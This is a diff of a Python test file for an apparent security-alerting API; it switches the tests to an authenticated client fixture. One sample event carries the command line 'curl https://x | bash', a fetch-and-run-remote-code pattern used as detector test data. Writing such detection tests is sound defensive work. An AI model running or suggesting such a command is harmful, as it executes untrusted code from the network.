@@ -1,13 +1,13 @@
 from datetime import datetime, timezone
 
 
-def test_health(client):
-    response = client.get("/api/v1/health")
+def test_health(auth_client):
+    response = auth_client.get("/api/v1/health")
     assert response.status_code == 200
     assert response.json()["status"] == "healthy"
 
 
-def test_event_ingest_creates_alert_and_finding(client):
+def test_event_ingest_creates_alert_and_finding(auth_client):
     payload = {
         "batch_id": "test-batch",
         "events": [
@@ -26,17 +26,17 @@ def test_event_ingest_creates_alert_and_finding(client):
             }
         ],
     }
-    response = client.post("/api/v1/ingest/events", json=payload)
+    response = auth_client.post("/api/v1/ingest/events", json=payload)
     assert response.status_code == 200
     assert response.json()["alerts_created"] == 1
 
-    overview = client.get("/api/v1/overview")
+    overview = auth_client.get("/api/v1/overview")
     body = overview.json()
     assert len(body["alerts"]) == 1
     assert len(body["findings"]) == 1
 
 
-def test_event_ingest_is_idempotent(client):
+def test_event_ingest_is_idempotent(auth_client):
     event = {
         "event_id": "evt-duplicate",
         "host_id": "lin-01",
@@ -48,10 +48,10 @@ def test_event_ingest_is_idempotent(client):
         "process": {"name": "bash", "command_line": "curl https://x | bash"},
     }
     payload = {"batch_id": "batch-x", "events": [event]}
-    first = client.post("/api/v1/ingest/events", json=payload)
-    second = client.post("/api/v1/ingest/events", json=payload)
+    first = auth_client.post("/api/v1/ingest/events", json=payload)
+    second = auth_client.post("/api/v1/ingest/events", json=payload)
     assert first.json()["stored_events"] == 1
     assert second.json()["stored_events"] == 0
 
-    alerts = client.get("/api/v1/alerts").json()
+    alerts = auth_client.get("/api/v1/alerts").json()
     assert len(alerts) == 1
